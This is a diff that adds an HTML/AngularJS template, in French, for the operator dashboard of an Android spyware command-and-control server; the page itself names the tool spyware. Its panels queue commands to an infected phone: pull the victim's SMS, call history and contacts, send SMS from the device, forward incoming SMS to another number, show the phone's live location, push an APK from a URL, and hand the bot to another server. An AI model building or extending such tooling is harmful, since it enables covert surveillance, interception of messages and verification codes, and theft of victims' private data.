@@ -1,0 +1,303 @@
+<div class="s-layout">
+    <div class="s-layout__sidebar">
+        <a class="s-sidebar__trigger">
+            <i class="material-icons">menu</i>
+        </a>
+
+        <nav class="s-sidebar__nav" ng-init="sidebar = 1">
+            <ul>
+                <li>
+                    <a class="s-sidebar__nav-link" href="#">
+                        <img src="https://i.imgur.com/wMvCEno.png" style="width: 100%; margin-top: 20px">
+                    </a>
+                </li>
+                <li style="background: #fff; min-height: 100px; ">
+                    <h3 style="margin-top: 50px; text-align: center; padding: 30px 0 0 0;">
+                        <span ng-show="!bot.updated">{{bot.device}}</span>
+                        <span class="text-success" ng-show="bot.status && bot.updated">{{bot.device}} <span class="pulseGreen"></span></span>
+                        <span class="text-danger" ng-show="!bot.status && bot.updated">{{bot.device}} <span class="pulseRed"></span></span>
+                        <p style="font-weight: 500; margin-top: -3px; text-align: center; font-size: 14px; color: #0d0c2c;">
+                            {{bot.updated | amCalendar:referenceTime:formats}}</p>
+                    </h3>
+                </li>
+                <li>
+                    <a class="s-sidebar__nav-link" id="dashboard_open" ng-click="sidebar = 1">
+                        <i class="material-icons">dashboard</i><em>Tableau de bord</em>
+                    </a>
+                </li>
+                <li>
+                    <a class="s-sidebar__nav-link" ng-click="sidebar = 2">
+                        <i class="material-icons">textsms</i><em>SMS</em>
+                    </a>
+                </li>
+                <li>
+                    <a class="s-sidebar__nav-link" ng-click="sidebar = 3">
+                        <i class="material-icons">call</i><em>Appels
+                        <span class="badge-side" ng-hide="!callLogs">{{ callLogs.length }}</span></em>
+                    </a>
+                </li>
+                <li>
+                    <a class="s-sidebar__nav-link" ng-click="sidebar = 4">
+                        <i class="material-icons">contacts</i><em>Contacts <span class="badge-side" ng-hide="!contacts">{{ contacts.length }}</span></em>
+                    </a>
+                </li>
+                <li>
+                    <a class="s-sidebar__nav-link" ng-click="sidebar = 5">
+                        <i class="material-icons">verified_user</i><em>Permissions</em>
+                    </a>
+                </li>
+                <li>
+                    <a class="s-sidebar__nav-link" ng-click="sidebar = 6">
+                        <i class="material-icons">filter_list</i><em>En attente</em>
+                    </a>
+                </li>
+                <li>
+                    <a class="s-sidebar__nav-link" ng-click="sidebar = 7">
+                        <i class="material-icons">settings</i><em>Paramètres</em>
+                    </a>
+                </li>
+                <li>
+                    <a class="s-sidebar__nav-link" href="#">
+                        <i class="material-icons">keyboard_backspace</i><em>Retour</em>
+                    </a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <main class="s-layout__content">
+        <div id="dashboard" class="animated fadeInDown" ng-show="sidebar == 1">
+            <div class="row">
+                <h1 style="color: #fff; margin-left: 15px"><i class="material-icons">dashboard</i> Tableau de Bord</h1>
+                <div class="col-md-5">
+                    <h2 style="color: #b5acb9">Messages</h2>
+                    <div style="overflow-y: scroll; max-height: 70vh">
+                        <div ng-show="!hasMessages">
+                            <div class="spinner">
+                                <div class="double-bounce1"></div>
+                                <div class="double-bounce2"></div>
+                            </div>
+                        </div>
+                        <div ng-show="hasMessages">
+                            <a ng-repeat="(thread, dateMessages) in messageThreads | orderObjectBy: 'last_date':true" class="list-group-item" sms-thread thread="thread" messages="dateMessages.messages"></a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-3" style="height: 80vh">
+                    <h2 style="color: #b5acb9">Position live</h2>
+                    <div class="map-view">
+                        <ui-gmap-google-map center='map.center' zoom='map.zoom' draggable="true">
+                            <ui-gmap-marker idKey='bot.id' coords='{latitude: bot.lat, longitude: bot.longi}'>
+                            </ui-gmap-marker>
+                        </ui-gmap-google-map>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <h2 style="color: #b5acb9">Appels</h2>
+                    <div style="overflow-y: scroll; max-height: 70vh">
+                        <div ng-show="!callLogs">
+                            <div class="spinner">
+                                <div class="double-bounce1"></div>
+                                <div class="double-bounce2"></div>
+                            </div>
+                        </div>
+                        <b ng-show="callLogs.length === 0">Aucun appel passé.</b>
+                        <div class="call-logs-view" ng-show="callLogs.length > 0">
+                            <div class="list-group">
+                                <div class="list-group-item" ng-repeat="log in callLogs | orderBy: 'date':true" call-log-item="log">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="sms" class="animated fadeInDown" ng-show="sidebar == 2">
+            <div class="row">
+                <h1 style="color: #fff; margin-left: 15px"><i class="material-icons">textsms</i> SMS</h1>
+                <div class="col-md-6">
+                    <h3 style="color: white">Récupérer les SMS</h3>
+                    <form name="smsForm">
+                        <div class="form-group">
+                            <button type="submit" ng-disabled="smsForm.$invalid" class="btn btn-primary" ng-click="addCommand('getsms', 99999999)">
+                                Actualiser
+                            </button>
+                            <a class="btn btn-danger" ng-click="clearSMS()">Supprimer la liste</a>
+                        </div>
+                    </form>
+                    <hr>
+                    <div style="overflow-y: auto; height: 70vh">
+                        <strong ng-show="!hasMessages">Aucun message.</strong>
+                        <div ng-show="hasMessages">
+                            <a ng-repeat="(thread, dateMessages) in messageThreads | orderObjectBy: 'last_date':true" class="list-group-item" sms-thread thread="thread" messages="dateMessages.messages"></a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <form name="sendSmsForm">
+                        <h3 style="color: white">Envoyer un message</h3>
+                        <div class="form-group">
+                            <button type="submit" ng-disabled="sendSmsForm.$invalid" class="btn btn-primary" ng-click="addCommand('sendsms', sendto_number, text_message)">
+                                Envoyer le SMS
+                            </button>
+                        </div>
+                        <hr>
+                        <div class="form-group" ng-class="">
+                            <label>Numéro de la personne</label>
+                            <input class="form-control" type="tel" name="sendto_number" ng-model="sendto_number" rows="10" required/>
+                        </div>
+                        <div class="form-group" ng-class="">
+                            <label>Contenu du message</label>
+                            <textarea class="form-control" ng-model="text_message" name="text_message" rows="5" required=""></textarea>
+                        </div>
+                    </form>
+                </div>
+                <div class="col-md-3">
+                    <form name="smsForwardForm">
+                        <h3 ng-class="{'text-success' : bot.sms_forwarder_status, 'text-danger':!bot.sms_forwarder_status}" style="color: white">
+                            Rediriger les SMS
+                            <span ng-show="bot.sms_forwarder_status">(activé)</span>
+                        </h3>
+                        <div class="form-group">
+                            <button type="submit" ng-disabled="smsForwardForm.$invalid || bot.sms_forwarder_status" class="btn btn-primary" ng-click="addCommand('smsforwarder', 'forward', bot.sms_forwarder_number)">
+                                Démarrer
+                            </button>
+                            <a class="btn btn-danger" ng-disabled="!bot.sms_forwarder_status" ng-click="addCommand('smsforwarder', 'stop')">Arréter</a>
+                        </div>
+                        <hr>
+
+                        <div class="form-group" ng-class="">
+                            <label>Rediriger vers le numéro</label>
+                            <input class="form-control" type="text" name="bot.sms_forwarder_number" ng-model="bot.sms_forwarder_number" rows="10" required/>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <div id="appels" class="animated fadeInDown" ng-show="sidebar == 3">
+            <div class="row">
+                <h1 style="color: #fff; margin-left: 15px"><i class="material-icons">call</i> Appels</h1>
+                <form name="callLogsForm">
+                    <div class="form-group">
+                        <button ng-disabled="callLogsForm.$invalid" class="btn btn-primary" ng-click="addCommand('getcallhistory', num_call_logs)">
+                            Récupérer l'historique
+                        </button>
+                        <a class="btn btn-danger" ng-click="clearCallLogs()">Supprimer l'historique</a>
+                    </div>
+                </form>
+                <hr>
+                <div style="overflow-y: auto; height: 78vh">
+                    <b ng-show="callLogs.length === 0">Aucun appel passé.</b>
+                    <div class="call-logs-view" ng-show="callLogs.length > 0">
+                        <div class="list-group">
+                            <div class="list-group-item" ng-repeat="log in callLogs | orderBy: 'date':true" call-log-item="log">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="contacts" class="animated fadeInDown" ng-show="sidebar == 4">
+            <div class="row">
+                <h1 style="color: #fff; margin-left: 15px"><i class="material-icons">contacts</i> Contacts</h1>
+                <button class="btn btn-primary" ng-click="addCommand('getcontacts')">Obtenir les contacts</button>
+                <button class="btn btn-danger" ng-click="deleteContacts()">Supprimer les contacts</button>
+                <hr>
+                <div style="overflow-y: auto; height: 78vh">
+                    <table class="table" ng-show="contacts.length > 0">
+                        <thead>
+                        <tr style="background: #1c1b4e;">
+                            <th>Nom</th>
+                            <th>Numéro</th>
+                        </tr>
+                        </thead>
+                        <tbody>
+                        <tr ng-repeat="contact in contacts">
+                            <td>{{contact.name}}</td>
+                            <td>
+                                {{contact.phone_numbers}}
+                            </td>
+                        </tr>
+                        </tbody>
+                    </table>
+                    <b ng-show="contacts.length === 0">Aucun contact</b>
+                </div>
+            </div>
+        </div>
+        <div id="permissions" class="animated fadeInDown" ng-show="sidebar == 5">
+            <div class="row">
+                <h1 style="color: #fff; margin-left: 15px"><i class="material-icons">verified_user</i> Permissions</h1>
+                <div class="col-md-12">
+                    <table class="table" ng-show="permissions.length > 0">
+                        <thead>
+                        <tr>
+                            <th>Permission</th>
+                            <th>Status</th>
+                        </tr>
+                        </thead>
+                        <tbody>
+                        <tr ng-repeat="perm in permissions">
+                            <td>{{perm.permission}}</td>
+                            <td>
+                                <span class="text-success" ng-if="perm.granted">Autorisé</span>
+                                <span class="text-danger" ng-if="!perm.granted">Refusé</span>
+                            </td>
+                        </tr>
+                        </tbody>
+                    </table>
+                    <b ng-show="permissions.length === 0">Aucune info</b>
+                </div>
+            </div>
+        </div>
+        <div id="waiting" class="animated fadeInDown" ng-show="sidebar == 6">
+            <div class="row">
+                <h1 style="color: #fff; margin-left: 15px"><i class="material-icons">filter_list</i> File d'attente</h1>
+                <div class="col-md-12">
+                    <div class="list-group">
+                        <div class="row">
+                            <div class="col-md-3" ng-repeat="cmd in pendingCommands">
+                                <div class="list-group-item" style="color: #0d0c2c; font-weight: bold">
+                                    • {{cmd.command}}
+                                    <a class="btn btn-danger btn-sm" ng-click="deleteCommand(cmd.id)">&times;</a>
+                                </div>
+                            </div>
+                        </div>
+                        <p ng-show="pendingCommands.length === 0">Aucune commande en attente</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="settings" class="animated fadeInDown" ng-show="sidebar == 7">
+            <div class="row">
+                <h1 style="color: #fff; margin-left: 15px"><i class="material-icons">settings</i> Paramètres</h1>
+                <div class="col-md-12">
+                    <form name="updateApkForm">
+                        <div class="form-group ">
+                            <label>Mettre à jour l'application</label>
+                            <input placeholder="URL de l'application" class=" form-control" type="url" name="apkUrl" ng-model="update_url" required>
+                        </div>
+                        <div class="form-group">
+                            <button ng-disabled="updateApkForm.$invalid" class="btn btn-primary" ng-click="addCommand('promptupdate', update_url)">
+                                Mettre à jour
+                            </button>
+                        </div>
+                    </form>
+                    <hr>
+                    <form name="transferBotForm">
+                        <div class="form-group ">
+                            <label>Transfèrer le spyware vers un autre serveur</label>
+                            <input class=" form-control" placeholder="URL du nouveau serveur" type="url" name="apkUrl" ng-model="server_url" required>
+                        </div>
+                        <div class="form-group">
+                            <button ng-disabled="transferBotForm.$invalid" class="btn btn-primary" ng-click="addCommand('transferbot', server_url)">
+                                Transferer le SpyWare
+                            </button>
+                        </div>
+                    </form>
+                    <hr>
+                    <a ng-click="removeDevice(bot)" class="btn btn-danger">Supprimer l'appareil</a>
+                </div>
+            </div>
+        </div>
+    </main>
+</div>
